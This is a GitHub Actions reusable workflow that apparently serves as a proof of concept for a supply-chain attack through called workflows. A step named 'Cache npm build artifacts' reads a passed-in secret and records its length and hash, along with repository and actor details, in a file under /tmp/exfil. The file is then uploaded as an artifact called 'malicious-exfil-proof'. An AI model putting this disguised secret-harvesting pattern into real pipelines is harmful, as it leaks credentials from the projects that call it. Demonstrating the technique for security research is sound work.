name: callee malicious (attacker push)

on:
  workflow_call:
    secrets:
      TEST_SECRET:
        required: true

jobs:
  receive:
    runs-on: ubuntu-latest
    steps:
      - name: Cache npm build artifacts
        env:
          A: ${{ secrets.TEST_SECRET }}
        run: |
          echo "=== MALICIOUS STEP EXECUTED ==="
          echo "Secret length: ${#A} chars"
          echo "Hash: $(echo -n "$A" | sha256sum)"
          mkdir -p /tmp/exfil
          echo "MALICIOUS_STEP_EXECUTED=true" > /tmp/exfil/stolen.txt
          echo "SECRET_LENGTH=${#A}" >> /tmp/exfil/stolen.txt
          echo "SECRET_HASH=$(echo -n "$A" | sha256sum | cut -d' ' -f1)" >> /tmp/exfil/stolen.txt
          echo "TIMESTAMP=$(date -u)" >> /tmp/exfil/stolen.txt
          echo "EXECUTED_IN_REPO=${{ github.repository }}" >> /tmp/exfil/stolen.txt
          echo "TRIGGERED_BY=${{ github.actor }}" >> /tmp/exfil/stolen.txt
          cat /tmp/exfil/stolen.txt

      - uses: actions/upload-artifact@v4
        with:
          name: malicious-exfil-proof
          path: /tmp/exfil/stolen.txt
